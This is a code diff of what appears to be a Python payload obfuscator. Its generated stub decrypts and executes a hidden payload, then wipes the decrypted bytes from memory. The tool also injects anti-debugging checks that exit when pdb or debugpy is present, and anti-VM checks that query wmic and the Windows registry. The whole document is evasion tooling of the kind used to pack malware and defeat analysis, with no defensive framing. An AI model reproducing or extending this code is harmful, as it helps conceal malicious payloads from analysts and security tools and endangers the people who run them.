@@ -71,7 +71,7 @@ _p3 = _f[3](_p2)
 _p4 = _f[1](_p3)
 _v_d_b = getattr(_v_c, ''.join(map(chr, [100, 101, 99, 114, 121, 112, 116])))(_p4)
 _v_m = _f[6](_v_d_b)
-_f[7](_f[2](_v_m.tobytes()))
+_f[7](_f[2](_v_m.tobytes()), globals())
 try:
     for pattern in [0x00, 0xFF, _f[12](0, 255)]:
         _f[11](_f[10](_f[9].from_buffer(bytearray(_v_d_b))), pattern, len(_v_d_b))
@@ -311,7 +311,7 @@ def encode_b64(data):
 
 
 def obfuscate_code(code):
-    code_to_process = code
+    main_code = []
     payload_imports = []
     seen_imports = set(payload_imports)
     for line in code.split("\n"):
@@ -322,6 +322,9 @@ def obfuscate_code(code):
         ):
             seen_imports.add(stripped_line)
             payload_imports.append(stripped_line)
+        else:
+            main_code.append(line)
+    code_to_process = main_code
     encoded_import_lines = []
     for imp_line in payload_imports:
         marshalled = marshal.dumps(imp_line.encode())
@@ -332,11 +335,7 @@ def obfuscate_code(code):
         [f"_x(b'{line.decode()}')" for line in encoded_import_lines]
     )
     final_import_calls = "\n" + final_import_calls
-    anti_debug_code = """import sys
-import os
-import ctypes
-    
-def is_debugger_present():
+    anti_debug_code = """def is_debugger_present():
     debugging_modules = {
         'pdb',
         'debugpy',
@@ -384,17 +383,7 @@ if is_debugger_present():
     os._exit(0)
 
 """
-    anti_vm_code = """import ctypes
-import os
-import re
-import subprocess
-import time
-import winreg
-from concurrent.futures import ThreadPoolExecutor
-
-import psutil
-
-def is_vm():
+    anti_vm_code = """def is_vm():
     try:
         output = subprocess.check_output(
             ['wmic', 'computersystem', 'get', 'model'],
